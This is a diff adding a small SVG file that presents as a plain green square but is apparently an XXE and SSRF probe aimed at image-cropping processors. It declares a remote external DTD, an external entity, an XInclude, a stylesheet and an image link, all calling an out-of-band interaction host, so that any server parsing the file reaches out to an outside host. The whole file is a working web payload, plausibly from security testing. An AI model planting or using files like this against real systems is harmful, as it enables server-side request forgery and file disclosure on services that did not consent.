@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet href="https://ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun/file415-crop-stylesheet-b31f" type="text/css"?>
+<!DOCTYPE svg [
+  <!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/naysser/svg/main/22-crop-processor-oast.dtd">
+  %remote;
+  <!ENTITY direct SYSTEM "https://ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun/file415-crop-entity-b31f">
+]>
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xi="http://www.w3.org/2001/XInclude"
+     width="64" height="64">
+  <rect width="64" height="64" fill="#008000"/>
+  <text x="2" y="16">&direct;</text>
+  <xi:include href="https://ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun/file415-crop-xinclude-b31f" parse="text"/>
+  <image href="https://ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun/file415-crop-image-b31f" width="1" height="1"/>
+</svg>
